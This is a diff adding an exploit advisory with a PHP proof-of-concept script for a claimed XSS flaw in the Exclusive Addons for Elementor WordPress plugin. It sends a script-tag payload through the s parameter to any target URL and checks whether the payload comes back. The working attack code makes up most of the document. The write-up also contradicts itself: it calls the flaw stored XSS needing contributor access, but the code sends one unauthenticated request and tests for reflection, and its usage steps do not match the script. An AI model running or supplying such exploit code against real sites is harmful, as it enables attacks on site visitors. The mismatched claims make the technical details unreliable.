@@ -1,0 +1,98 @@
+=============================================================================================================================================
+| # Title     : Exclusive Addons for Elementor 2.6.9 XSS                                                                                    |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://wordpress.org/plugins/exclusive-addons-for-elementor/                                                               |
+=============================================================================================================================================
+
+[+] Summary : 
+
+The plugin fails to sanitize the s parameter, allowing contributors or higher roles to inject persistent JavaScript that executes when victims view affected pages.
+
+[+] References : ( https://nvd.nist.gov/vuln/detail/CVE-2024-1234 & CVE-2024-1234 ) 
+
+1. Save the file as: poc.php
+
+2. Edit the target:
+```php
+$target = "http://TARGET";
+
+3.Execute: php poc.php
+
+[+]  POC
+
+<?php
+/**
+ * CVE-2024-1234
+ * Exclusive Addons for Elementor ≤ 2.6.9 - Stored XSS
+ * by Indoushka
+ */
+
+error_reporting(0);
+
+/* ==========================
+   Banner
+   ========================== */
+function banner() {
+    echo str_repeat("=", 60) . "\n";
+    echo "CVE-2024-1234: Exclusive Addons for Elementor Plugin Stored XSS\n";
+    echo "by Indoushka\n";
+    echo str_repeat("=", 60) . "\n\n";
+}
+
+/* ==========================
+   Validate URL
+   ========================== */
+function validate_url($url) {
+    if (!preg_match('/^https?:\/\//i', $url)) {
+        echo "[✖] Invalid URL. Must start with http:// or https://\n";
+        return false;
+    }
+    return true;
+}
+
+/* ==========================
+   XSS Exploit Function
+   ========================== */
+function exploit_xss($target) {
+
+    $payload = "<script>alert('XSS-INDOUSHKA')</script>";
+
+    $url = $target . "?s=" . urlencode($payload);
+
+    echo "[+] Sending exploit to: $url\n";
+
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+
+    $response = curl_exec($ch);
+    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($code == 200 && strpos($response, $payload) !== false) {
+        echo "[✔] Stored XSS Successful!\n";
+        echo "[✔] Payload injected: $payload\n";
+    } elseif ($code != 200) {
+        echo "[✖] Server returned HTTP $code\n";
+    } else {
+        echo "[✖] Payload not reflected or exploit failed.\n";
+    }
+}
+
+/* ==========================
+   Main
+   ========================== */
+banner();
+
+echo "Enter the target URL: ";
+$target = trim(fgets(STDIN));
+
+if (validate_url($target)) {
+    exploit_xss($target);
+}
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
